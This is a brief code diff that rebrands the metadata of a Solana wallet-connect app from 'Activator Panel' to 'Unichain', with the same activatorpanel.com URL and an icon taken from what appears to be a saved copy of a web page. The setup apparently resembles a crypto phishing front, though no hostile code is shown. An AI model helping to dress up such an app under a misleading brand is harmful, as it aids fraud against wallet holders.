@@ -497,8 +497,8 @@ const solanaWeb3JsAdapter = new SolanaAdapter();
 
 // Set up the metadata
 const metadata = {
-  name: 'Activator Panel',
-  description: 'Account and wallet validator tool',
+  name: 'Unichain',
+  description: 'Onchain resolution for Whitelists',
   url: 'https://activatorpanel.com',
   icons: ['https://app.appactivation-panel.com/Home%20Page%20_%20Welcome%20to%20Panelactivator.com_files/save_bckudy.png'],
 };
